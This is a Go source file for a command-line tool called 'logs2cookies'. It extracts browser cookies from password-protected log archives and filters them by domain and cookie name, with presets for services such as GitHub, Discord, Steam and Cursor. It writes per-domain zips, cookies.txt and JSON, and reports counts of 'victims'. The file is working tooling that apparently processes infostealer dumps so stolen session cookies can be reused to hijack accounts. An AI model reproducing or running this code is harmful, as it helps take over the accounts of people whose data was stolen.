package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

// CLI filter hooks read by Spool.Add
var (
	cliKeepExpired   bool
	cliKeepEmpty     bool
	cliNameFilter    []string
	cliDomainFilter  []string
	cliStrictDomains bool
)

// runCLIExtract is the offline path:
//
//	logs2cookies extract <archive.zip|rar> [--preset cursor] [--domains a,b] [--names x,y] [--out dir]
func runCLIExtract(args []string) {
	if len(args) == 0 || args[0] == "-h" || args[0] == "--help" {
		fmt.Print(cliExtractHelp())
		os.Exit(0)
	}

	var (
		archive     string
		outDir      = "./out"
		password    string
		presets     []string
		domains     []string
		names       []string
		keepExpired bool
		keepEmpty   bool
		split       bool
	)

	for i := 0; i < len(args); i++ {
		a := args[i]
		next := func() string {
			if i+1 >= len(args) {
				fmt.Fprintf(os.Stderr, "missing value for %s\n", a)
				os.Exit(2)
			}
			i++
			return args[i]
		}
		switch a {
		case "--list-presets":
			for _, p := range BuiltinPresets {
				fmt.Printf("%s  %-10s  domains=%s  names=%d\n",
					p.Emoji, p.Name, strings.Join(p.Domains, ","), len(p.CookieNames))
			}
			os.Exit(0)
		case "--preset", "-p":
			presets = append(presets, strings.Split(next(), ",")...)
		case "--domains", "-d":
			domains = append(domains, splitCSV(next())...)
		case "--names", "-n":
			names = append(names, splitCSV(next())...)
		case "--out", "-o":
			outDir = next()
		case "--password", "-pw":
			password = next()
		case "--keep-expired":
			keepExpired = true
		case "--keep-empty":
			keepEmpty = true
		case "--split":
			split = true
		case "-h", "--help":
			fmt.Print(cliExtractHelp())
			os.Exit(0)
		default:
			if strings.HasPrefix(a, "-") {
				fmt.Fprintf(os.Stderr, "unknown flag: %s\n", a)
				os.Exit(2)
			}
			if archive == "" {
				archive = a
			} else {
				fmt.Fprintf(os.Stderr, "unexpected arg: %s\n", a)
				os.Exit(2)
			}
		}
	}
	if archive == "" {
		fmt.Fprintln(os.Stderr, "archive path required")
		os.Exit(2)
	}
	if _, err := os.Stat(archive); err != nil {
		fmt.Fprintf(os.Stderr, "archive: %v\n", err)
		os.Exit(1)
	}

	for _, pn := range presets {
		pn = strings.TrimSpace(pn)
		if pn == "" {
			continue
		}
		p := getBuiltinPreset(pn)
		if p == nil {
			fmt.Fprintf(os.Stderr, "unknown preset %q — try --list-presets\n", pn)
			os.Exit(2)
		}
		domains = append(domains, p.Domains...)
		names = append(names, p.CookieNames...)
	}
	domains = normalizeDomains(domains)
	names = normalizeDomains(names)

	cliKeepExpired = keepExpired
	cliKeepEmpty = keepEmpty
	cliNameFilter = names
	cliDomainFilter = domains
	cliStrictDomains = len(domains) > 0

	if err := os.MkdirAll(outDir, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "out dir: %v\n", err)
		os.Exit(1)
	}

	spoolPath := filepath.Join(outDir, "cookies.spool")
	spool, err := NewSpool(spoolPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "spool: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("extracting %s …\n", archive)
	start := time.Now()
	perr := processArchiveSpool(archive, "", password, 0, spool)
	closeErr := spool.Close()
	if perr != nil {
		fmt.Fprintf(os.Stderr, "extract failed: %v\n", perr)
		os.Exit(1)
	}
	if closeErr != nil {
		fmt.Fprintf(os.Stderr, "spool close: %v\n", closeErr)
		os.Exit(1)
	}
	stats := spool.Stats()
	spool.FreeSeen()
	elapsed := time.Since(start).Round(time.Millisecond)

	fmt.Printf("scanned %s files · %s cookie files · %s unique cookies in %s\n",
		commafy(stats.ArchiveFiles), commafy(stats.CookieFiles), commafy(stats.UniqueCookies), elapsed)

	if stats.UniqueCookies == 0 {
		fmt.Println(noCookiesMessage(stats, strings.Join(domains, ",")))
		os.Exit(1)
	}

	type kv struct {
		k string
		v int
	}
	var ranked []kv
	for d, c := range stats.DomainCounts {
		ranked = append(ranked, kv{d, c})
	}
	sort.Slice(ranked, func(i, j int) bool { return ranked[i].v > ranked[j].v })
	fmt.Println("top domains:")
	for i, r := range ranked {
		if i >= 15 {
			break
		}
		fmt.Printf("  %6d  %s\n", r.v, r.k)
	}

	writeExtractSidecars(outDir, stats, domains, names, elapsed)

	if split && len(domains) > 0 {
		for _, d := range domains {
			// subdomain-aware: match exact domain key OR any domain that matches target
			selected := map[string]bool{}
			for dom := range stats.DomainCounts {
				if domainMatchesTarget(dom, d) {
					selected[dom] = true
				}
			}
			zipPath := filepath.Join(outDir, safeFilename(d)+".zip")
			n, rows, err := streamFilterToZip(spoolPath, zipPath, selected, nil)
			if err != nil {
				fmt.Fprintf(os.Stderr, "zip %s: %v\n", d, err)
				continue
			}
			if rows == 0 {
				os.Remove(zipPath)
				fmt.Printf("  skip %s (0 hits)\n", d)
				continue
			}
			fmt.Printf("  wrote %s — %d cookies · %d victims\n", zipPath, rows, n)
		}
	} else {
		zipPath := filepath.Join(outDir, "cookies.zip")
		selected := map[string]bool{}
		for d := range stats.DomainCounts {
			selected[d] = true
		}
		n, rows, err := streamFilterToZip(spoolPath, zipPath, selected, nil)
		if err != nil {
			fmt.Fprintf(os.Stderr, "zip: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("wrote %s — %d cookies · %d victims\n", zipPath, rows, n)
	}

	rows, _ := readSpool(spoolPath)
	if len(rows) > 0 {
		_ = writeNetscape(filepath.Join(outDir, "cookies.txt"), rows)
		_ = writeJSON(filepath.Join(outDir, "cookies.json"), rows)
	}
	fmt.Println("done.")
}

func cliExtractHelp() string {
	return `usage: logs2cookies extract <archive> [options]

Options:
  --preset, -p NAME     builtin preset (cursor, github, discord, steam, …)
  --domains, -d LIST    comma-separated domains (subdomain-aware)
  --names, -n LIST      comma-separated cookie names
  --out, -o DIR         output directory (default: ./out)
  --password, -pw PW    archive password
  --keep-expired        keep expired cookies
  --keep-empty          keep empty/deleted values
  --split               one zip per domain (default: single combined zip)
  --list-presets        print builtin presets and exit

Examples:
  logs2cookies extract logs.zip -p cursor
  logs2cookies extract logs.rar -d steamcommunity.com -n steamLoginSecure
  logs2cookies extract logs.zip -p github,discord -o ./hits
`
}

func writeExtractSidecars(outDir string, stats Stats, domains, names []string, elapsed time.Duration) {
	type kv struct {
		Domain  string `json:"domain"`
		Cookies int    `json:"cookies"`
	}
	var top []kv
	var keys []string
	for d := range stats.DomainCounts {
		keys = append(keys, d)
	}
	sort.Slice(keys, func(i, j int) bool {
		return stats.DomainCounts[keys[i]] > stats.DomainCounts[keys[j]]
	})
	for i, d := range keys {
		if i >= 50 {
			break
		}
		top = append(top, kv{d, stats.DomainCounts[d]})
	}
	manifest := map[string]any{
		"generated_by":    "logs2cookies-bot",
		"elapsed_ms":      elapsed.Milliseconds(),
		"archive_files":   stats.ArchiveFiles,
		"cookie_files":    stats.CookieFiles,
		"total_cookies":   stats.TotalCookies,
		"unique_cookies":  stats.UniqueCookies,
		"filter_domains":  domains,
		"filter_names":    names,
		"top_domains":     top,
		"browser_sources": stats.BrowserHints,
	}
	b, _ := json.MarshalIndent(manifest, "", "  ")
	_ = os.WriteFile(filepath.Join(outDir, "manifest.json"), b, 0o644)

	var sb strings.Builder
	fmt.Fprintf(&sb, "logs2cookies extract summary\n")
	fmt.Fprintf(&sb, "unique cookies: %d\n", stats.UniqueCookies)
	fmt.Fprintf(&sb, "cookie files:   %d\n", stats.CookieFiles)
	fmt.Fprintf(&sb, "elapsed:        %s\n", elapsed)
	if len(domains) > 0 {
		fmt.Fprintf(&sb, "domains:        %s\n", strings.Join(domains, ", "))
	}
	if len(names) > 0 {
		fmt.Fprintf(&sb, "names:          %s\n", strings.Join(names, ", "))
	}
	sb.WriteString("\ntop domains:\n")
	for i, d := range keys {
		if i >= 20 {
			break
		}
		fmt.Fprintf(&sb, "  %6d  %s\n", stats.DomainCounts[d], d)
	}
	_ = os.WriteFile(filepath.Join(outDir, "summary.txt"), []byte(sb.String()), 0o644)
}

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.FieldsFunc(s, func(r rune) bool {
		return r == ',' || r == ';' || r == ' ' || r == '\t'
	}) {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}
